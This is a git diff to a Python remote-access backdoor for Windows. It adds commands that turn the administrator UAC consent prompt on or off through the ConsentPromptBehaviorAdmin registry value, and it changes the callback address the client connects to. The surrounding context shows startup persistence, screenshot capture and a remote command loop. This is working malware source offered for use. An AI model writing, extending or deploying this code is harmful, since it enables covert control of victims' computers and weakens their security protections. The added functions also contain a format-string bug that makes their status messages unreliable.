@@ -89,6 +89,28 @@ class backdoor:
             if not on_startup:
                 return "[+] Successfully added to startup."
 
+
+    def enable_admin_confirm(self):
+        try:
+            REG_VALUE = "ConsentPromptBehaviorAdmin"
+            reg_key = OpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS)
+            SetValueEx(reg_key, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, 5)
+            CloseKey(reg_key)
+            return "[+] Ok: {}.".format()
+        except Exception as e:
+            return "[+] Adm Confirmation Disable."
+
+    def disable_admin_confirm(self):
+        try:
+            REG_VALUE = "ConsentPromptBehaviorAdmin"
+            reg_key = OpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS)
+            SetValueEx(reg_key, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, 0)
+            CloseKey(reg_key)
+            return "[+] Ok: {}.".format()
+        except Exception as e:
+            return "[+] Adm Confirmation Enable." #temporary fix
+            
+
     def remove_from_startup(self):
         try:
             reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
@@ -286,6 +308,10 @@ class backdoor:
                         command_result = self.remove_from_startup()
                     elif command_0 == "screenshot":     # Get screenshot
                         command_result = self.get_screenshot()
+                    elif command_0 == "enableadm":     # Enable "Run as Administrator" dialog confirmation
+                        command_result = self.enable_admin_confirm()
+                    elif command_0 == "disableadm":     # Disable "Run as Administrator" dialog confirmation
+                        command_result = self.disable_admin_confirm()
                     elif command_0 == "stsound":      # Stop playing a sound
                         command_result = self.task_manager.play_sound("", True)
                     elif command_0 == "idle":       # Get how much time idle
@@ -338,5 +364,5 @@ class backdoor:
 
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.0.13", 8080)
+my_backdoor = backdoor("192.168.0.76", 8080)
 my_backdoor.run()
